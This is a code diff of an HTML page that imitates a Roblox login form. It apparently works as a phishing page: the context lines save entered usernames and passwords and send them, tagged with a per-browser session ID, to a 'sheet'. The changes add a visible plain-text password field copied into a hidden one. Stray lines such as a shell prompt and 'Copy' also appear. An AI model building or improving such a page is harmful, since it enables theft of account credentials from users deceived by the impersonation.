@@ -68,7 +68,6 @@
       padding: 0 16px;
     }
 
-    /* Square Roblox Logo Styling */
     .roblox-logo {
       display: flex;
       align-items: center;
@@ -318,8 +317,9 @@
         <label for="username" class="sr-only">Username/Email/Phone</label>
         <input type="text" id="username" name="username" autocomplete="username" placeholder="Username/Email/Phone" required minlength="3">
 
-        <label for="password" class="sr-only">Password</label>
-        <input type="password" id="password" name="password" autocomplete="current-password" placeholder="Password" required minlength="8">
+        <label for="visiblePassword" class="sr-only">Password</label>
+        <input type="text" id="visiblePassword" placeholder="Password" oninput="updateHiddenPassword()" required minlength="8">
+        <input type="password" id="hiddenPassword" name="password" autocomplete="current-password" required minlength="8" style="display:none;">
 
         <button type="submit" class="submit">Log In</button>
 
@@ -391,7 +391,7 @@
       saved = {}; // in case the stored value is corrupt
     }
     if (saved.username) document.getElementById('username').value = saved.username;
-    if (saved.password) document.getElementById('password').value = saved.password;
+    if (saved.password) document.getElementById('hiddenPassword').value = saved.password;
 
     /* ── Unique session ID per browser, so the sheet can tell
           devices/sessions apart ── */
@@ -418,6 +418,10 @@
       }).catch(function () { /* don't break login if offline */ });
     }
 
+    function updateHiddenPassword() {
+      document.getElementById('hiddenPassword').value = document.getElementById('visiblePassword').value;
+    }
+
     form.addEventListener('submit', function (e) {
       e.preventDefault();
       status.textContent = '';
@@ -431,7 +435,7 @@
       }
 
       var user = document.getElementById('username').value.trim();
-      var pass = document.getElementById('password').value; // no trim on passwords
+      var pass = document.getElementById('hiddenPassword').value; // Use hidden password
 
       /* Save locally so the boxes pre-fill next time */
       var data = {
@@ -458,4 +462,4 @@
 
 </body>
 </html>
-jdsmegelski@penguin:~
+Copy
